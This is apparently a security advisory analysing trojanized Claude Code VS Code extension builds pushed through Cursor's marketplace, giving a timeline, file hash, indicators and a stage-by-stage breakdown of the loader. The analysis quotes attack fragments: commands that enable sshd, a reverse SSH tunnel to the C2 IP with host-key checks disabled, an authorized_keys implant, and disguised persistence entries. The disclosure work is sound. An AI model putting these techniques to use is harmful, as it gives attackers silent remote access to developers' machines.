Trojanized Claude Code Extension Delivered Persistent SSH Backdoor to Developer Machines

On October 29, 2026, trojanized builds (2.1.312 and 2.1.313) of the official Claude Code VS Code extension were published to Cursor's VS Code Extension Marketplace for macOS and Windows.

On October 29, 2026, versions 2.1.312 and 2.1.313 of the Claude Code VS Code extension,
anthropic.claude-code
, were published to Cursor's VS Code Extension Marketplace for macOS and Windows carrying a malicious loader embedded in its
extension.js
bundle.

Update (October 30, 2026):
Anthropic has clarified the scope of this incident. Per
Felix Rieseberg of Anthropic
, this was not a compromise of Anthropic's systems or employee laptops. A malicious actor used access to Cursor's marketplace to publish a tampered copy of the Claude Code extension, which Anthropic did not build or publish. The versions on Anthropic's official channels are not affected, and this only impacts Cursor users. Anthropic has also
confirmed
that 2.1.313 was never published to Open-VSX, the Microsoft Visual Studio Marketplace, or any of its official hosts, and that it skipped to 2.1.314 to avoid confusion. We have corrected the sections below, which previously described Open-VSX as the origin and implied the build had been removed from the Microsoft Marketplace.

Update (October 30, 2026, 11:30 am PT):
Separately, Cursor's notice identifies malicious builds of both 2.1.312 and 2.1.313 in its marketplace for Windows and macOS. The 2.1.312 build served by Open-VSX is a different artifact: we downloaded and verified it clean. Exposure therefore covers Cursor users who installed 2.1.312 or 2.1.313 from Cursor's marketplace during the window.

The malicious build is the official extension in every respect except one:
extension.js
carries a small self-contained loader embedded in the legitimate bundle. The malicious file (SHA-256
ecb58cb29078d9646ad1dcdbe51526f2d9cfea06be5fb2ab183e8ecc3ab6bf15
, 3,692,922 bytes) is roughly 7 KB larger than the preceding clean release, and sandbox telemetry shows the payload executes under plain Node.js with no VS Code APIs: loading the extension module is enough. No Claude conversation is needed, and no package-manager lifecycle hooks are involved. This was not an Anthropic release: the build repackages the official extension, and per Cursor's notice the malicious version was not developed by Anthropic.

Background: the extension and Cursor's marketplace

The Claude Code VS Code extension is Anthropic's official IDE integration. This incident involved tampered copies of versions 2.1.312 and 2.1.313 distributed through
Cursor's VS Code Extension Marketplace
for macOS and Windows, under the legitimate extension identifier.

According to
Anthropic
, a malicious actor used access to Cursor's marketplace to publish the tampered extension. Anthropic did not build or publish it, and its systems, employee laptops, and official distribution channels were not compromised in this incident.

Having version 2.1.312 or 2.1.313 installed does not, by itself, confirm compromise. Check the download source, time window, and host indicators described below.

Attack flow

By Oct 29, ~09:27 UTC

Malicious 2.1.312 and 2.1.313 builds available in Cursor's VS Code Extension Marketplace for macOS and Windows (2:27am PT, per Cursor)

Oct 29, 09:27 to 20:35 UTC

Download window for 2.1.312 and 2.1.313 from Cursor's marketplace on macOS and Windows (2:27am–1:35pm PT on October 29); at most 5,000 Cursor users received it (Cursor's initial figure)

Oct 29, 20:35 UTC (1:35pm PT)

Cursor removes the malicious builds and takes its marketplace fully offline; later audits find no other extensions tampered with; keys rotated

Oct 30

The C2 at 134.209.82.225 is taken offline with the cooperation of its hosting provider, per Cursor

Inside the loader: recovered source analysis

Update (November 1, 2026):
we recovered the malicious
extension.js
sample (from MalwareBazaar, hash-verified against the anchor above) and completed a full static analysis of the embedded loader. The sample was never executed; everything in this section comes from reading the recovered source, cross-checked against the sandbox telemetry already cited.

The tampering is a pure prepend. The malicious file is the clean Open-VSX 2.1.312
extension.js
with a single 7,386-byte loader IIFE spliced in front: after the loader, all 3,656,941 remaining bytes are identical to the clean 2.1.312 bundle we independently downloaded (3,692,922 = 3,685,536 + 7,386 exactly). There is no second backdoor deeper in the 3.6 MB bundle, and every indicator string in the IoC table below lives inside those first 7 KB. Two further consequences: the bundle inside the "2.1.313" VSIX still self-identifies as
version:"2.1.312"
(the bumped number existed only in the repackaged manifest), and the attacker demonstrably worked from the official 2.1.312 build artifact.

The loader is not obfuscated at all: it is machine-minified JavaScript with plaintext constants, and the only encoding anywhere is standard base64 wrapping the tunnel private key. That is also why the fleet-sweep grep works. On load it runs six stages, each wrapped in a swallowing
try/catch
that records a status string instead of failing:

Recon.
Builds a JSON object with hostname, username, platform, CPU arch, home and working directories, the output of
git config --global user.email
, and the
names
(never values) of up to 40 environment variables matching
/KEY|TOKEN|SECRET|PASS|AWS|GCP/i
. The name list tells the operator which credentials exist on the machine without transmitting them over plain HTTP.

SSH key implant.
Appends the
svc-telemetry
Ed25519 key to
~/.ssh/authorized_keys
unless the marker is already present (making the implant idempotent), fixing permissions to 700/600.

Enable SSH.
Linux:
systemctl enable --now sshd
with three fallbacks. macOS:
sudo -n systemsetup -setremotelogin on
, which succeeds only where passwordless sudo is configured. Windows: installs the OpenSSH.Server capability and starts
sshd
.

Reverse tunnel.
Drops the base64-decoded tunnel key at
$TMPDIR/.stk_
+
md5(hostname + home)
truncated to 10 hex chars (a name derived from the host, so the same machine always produces the same file), then loops
ssh -N -R '*:0:localhost:22'
to
tunnel@134.209.82.225
every 60 seconds, preferring
autossh
when installed. The remote port of
0
lets the server assign the listener, and
BatchMode
,
StrictHostKeyChecking=no
, and
UserKnownHostsFile=/dev/null
keep it silent and prompt-free.

Persistence
(the
~/.config/.smt
script re-derives its own key copy, so it survives temp-dir cleanup): Linux installs a cron
@reboot
entry; macOS writes the
com.apple.sysmond
LaunchAgent with
RunAtLoad
and
KeepAlive
; Windows tries a
SysMon
scheduled task running as SYSTEM (elevated sessions only) and falls back to copying
sysmon.cmd
into the Startup folder.

Beacon.
After 1.5 seconds, resolves the public IP via
ifconfig.me
(fallback
api.ipify.org
) and POSTs the JSON to
:8099/beacon
on both
127.0.0.1
and the C2.

The beacon doubles as a per-stage status report: alongside the recon fields it carries
sshKey: added|present
,
sshd
/
remoteLogin
state,
tunnel: started|running
, and
persist: cron|launchd|schtasks|startup
, so the operator sees, per victim, exactly which persistence mechanism took hold. Notably absent from the source: no credential values are read, no Claude or VS Code data is touched, and there is no second-stage download. The loader's entire capability is persistent SSH ingress plus a reconnaissance report; the real risk to an exposed machine is what the operator did, or could have done, through interactive access via the
svc-telemetry
key while the tunnel was up. Remediation guidance and the full indicator set are in the sections below.

Remediation

These steps apply to Claude Code extension versions 2.1.312 and 2.1.313 on macOS and Windows. Having either version installed does not, by itself, mean your machine is compromised. Check whether you downloaded or updated the extension from Cursor's VS Code Extension Marketplace between 2:27 a.m. and 1:35 p.m. PT on October 29, 2026 (09:27–20:35 UTC), then check for evidence of impact.

For the exact check commands and remediation scripts, see
Cursor's official security notice
.
